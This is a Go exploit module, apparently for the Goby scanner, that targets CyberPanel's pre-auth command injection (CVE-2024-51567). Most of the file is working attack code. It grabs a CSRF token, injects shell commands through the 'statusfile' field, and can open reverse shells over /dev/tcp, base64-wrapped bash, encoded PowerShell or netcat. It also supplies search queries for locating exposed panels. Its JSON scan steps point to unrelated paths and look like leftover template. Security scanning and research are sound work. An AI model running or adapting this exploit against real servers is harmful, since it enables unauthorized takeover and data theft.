package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "CyberPanel /dataBases/upgrademysqlstatus Command Execution Vulnerability(CVE-2024-51567)",
    "Description": "<p>CyberPanel is an open source web control panel that provides a user-friendly interface for managing websites, emails, databases, FTP accounts, etc. CyberPanel is designed to simplify website management tasks, allowing non-technical users to easily manage their online resources. The /dataBases/upgrademysqlstatus interface has a command execution vulnerability. Unauthorized attackers can execute arbitrary commands through this interface to obtain server permissions, resulting in serious consequences such as data leakage and server takeover.</p>",
    "Product": "CyberPanel",
    "Homepage": "https://cyberpanel.net/",
    "DisclosureDate": "2024-10-27",
    "PostTime": "2024-10-29",
    "Author": "2826161446@qq.com",
    "FofaQuery": "(title==\" Login - CyberPanel \" && body!=\"content=\\\"Login to CyberPanel hosted by FFEHost\") || (body=\"src=\\\"/static/baseTemplate/cyber-panel-logo.svg\" && (title=\"Login - CyberPanel\" || body=\"login-changelogs\\\" href=\\\"https://go.cyberpanel.net/updates\" || body=\"Powered By OpenLiteSpeed/LiteSpeed Enterprise. Built For Speed\" || body=\"Powered By OpenLiteSpeed. Built For Speed, Security\")) || body=\"href=\\\"https://go.cyberpanel.net/updates\" || (body=\"<script src=\\\"/static/loginSystem/login-systen.js\\\"></script>\" && body=\"verifyLoginCredentials\" && (body=\"src=\\\"/static/images/cyber-panel-logo.svg\" || body=\"CyberPanel\"))",
    "GobyQuery": "(title==\" Login - CyberPanel \" && body!=\"content=\\\"Login to CyberPanel hosted by FFEHost\") || (body=\"src=\\\"/static/baseTemplate/cyber-panel-logo.svg\" && (title=\"Login - CyberPanel\" || body=\"login-changelogs\\\" href=\\\"https://go.cyberpanel.net/updates\" || body=\"Powered By OpenLiteSpeed/LiteSpeed Enterprise. Built For Speed\" || body=\"Powered By OpenLiteSpeed. Built For Speed, Security\")) || body=\"href=\\\"https://go.cyberpanel.net/updates\" || (body=\"<script src=\\\"/static/loginSystem/login-systen.js\\\"></script>\" && body=\"verifyLoginCredentials\" && (body=\"src=\\\"/static/images/cyber-panel-logo.svg\" || body=\"CyberPanel\"))",
    "Level": "3",
    "Impact": "<p>The /dataBases/upgrademysqlstatus interface has a command execution vulnerability. Unauthorized attackers can execute arbitrary commands through this interface to obtain server permissions, resulting in serious consequences such as data leakage and server takeover.</p>",
    "Recommendation": "<p>1. Follow the manufacturer's official website and keep up with updated information in a timely manner: <a href=\"https://cyberpanel.net/\">https://cyberpanel.net/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit the public from accessing the system.</p>",
    "References": [
        "https://dreyand.rs/code/review/2024/10/27/what-are-my-options-cyberpanel-v236-pre-auth-rce"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBashBase64",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/tools_command.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "cmb_header=&txt_command=pwd"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2024-51567"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "CyberPanel /dataBases/upgrademysqlstatus 命令执行漏洞（CVE-2024-51567）",
            "Product": "CyberPanel",
            "Description": "<p><br>CyberPanel是一个开源的Web控制面板，它提供了一个用户友好的界面，用于管理网站、电子邮件、数据库、FTP账户等。CyberPanel旨在简化网站管理任务，使非技术用户也能轻松管理自己的在线资源。/dataBases/upgrademysqlstatus接口存在命令执行漏洞，未授权的攻击者可以通过此接口执行任意命令获取服务器权限，从而造成数据泄露、服务器被接管等严重的后果。<br></p>",
            "Recommendation": "<p>1.关注厂商官网，及时关注更新信息：<a href=\"https://cyberpanel.net/\">https://cyberpanel.net/</a><a href=\"https://www.surfboard.com/\"></a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>未授权的攻击者可以通过此接口执行任意命令获取服务器权限，从而造成数据泄露、服务器被接管等严重的后果。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "CyberPanel /dataBases/upgrademysqlstatus Command Execution Vulnerability(CVE-2024-51567)",
            "Product": "CyberPanel",
            "Description": "<p>CyberPanel is an open source web control panel that provides a user-friendly interface for managing websites, emails, databases, FTP accounts, etc. CyberPanel is designed to simplify website management tasks, allowing non-technical users to easily manage their online resources. The /dataBases/upgrademysqlstatus interface has a command execution vulnerability. Unauthorized attackers can execute arbitrary commands through this interface to obtain server permissions, resulting in serious consequences such as data leakage and server takeover.<br></p>",
            "Recommendation": "<p>1. Follow the manufacturer's official website and keep up with updated information in a timely manner:&nbsp;<a href=\"https://cyberpanel.net/\">https://cyberpanel.net/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit the public from accessing the system.</p>",
            "Impact": "<p>The /dataBases/upgrademysqlstatus interface has a command execution vulnerability. Unauthorized attackers can execute arbitrary commands through this interface to obtain server permissions, resulting in serious consequences such as data leakage and server takeover.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9964"
}`
	setPayloadRequestHashQgLPm6r9 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		//获取csrftoken
		getRequestConfig := httpclient.NewGetRequestConfig("/")
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = true
		getRequestConfig.Timeout = 15
		head1 := map[string]string{
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
		}
		for headName, headValue := range head1 {
			getRequestConfig.Header.Store(headName, headValue)
		}
		//请求
		resp, err1 := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err1 != nil || resp == nil {
			return "", "", err1
		} //错误检查
		regular := `csrftoken=([\s\S]*?);`
		makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
			reRequest := regexp.MustCompile(RegularUrl)
			if !reRequest.MatchString(RegularContent) {
				return "", fmt.Errorf("can't match value")
			}
			getname := reRequest.FindStringSubmatch(RegularContent)
			return getname[1], nil
		}
		csrftoken, err := makeRegular(resp.RawBody, regular)

		//命令执行
		//漏洞url地址
		vulPath := "/dataBases/upgrademysqlstatus"
		optionsRequestConfig := httpclient.NewRequestConfig("OPTIONS", vulPath)
		optionsRequestConfig.VerifyTls = false
		optionsRequestConfig.FollowRedirect = false
		optionsRequestConfig.Data = "{\"statusfile\":\"/dev/null;" + command + "; #\"}"
		//请求头
		head := map[string]string{
			"Content-Type": "application/json",
			"X-CSRFToken":  csrftoken,
			"Cookie":       "csrftoken=" + csrftoken,
		}
		for headName, headValue := range head {
			optionsRequestConfig.Header.Store(headName, headValue)
		}
		//请求
		response, err := httpclient.DoHttpRequest(hostInfo, optionsRequestConfig)
		if err != nil || response == nil {
			return "", "", err
		} //错误检查
		regStr := `"requestStatus": "([\s\S]*?)\\n"` //正则表达式
		regObj := regexp.MustCompile(regStr)
		if !regObj.MatchString(response.RawBody) {
			return "", "", errors.New("RCE Fail")
		}
		getname := regObj.FindStringSubmatch(response.RawBody)

		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := getname[1]
		if len(commandResult) == 0 {
			return "", "", errors.New("RCE Fail")
		}
		return commandResult, vulPath, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashQgLPm6r9

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashQgLPm6r9

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			ReverseTcpByBusyBox := func(rp string) string {
				return fmt.Sprintf("busybox sh -c 'sh -i >& /dev/tcp/%s/%s 0>&1'", godclient.GetGodServerIP(), rp)
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByBusyBox":          ReverseTcpByBusyBox,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
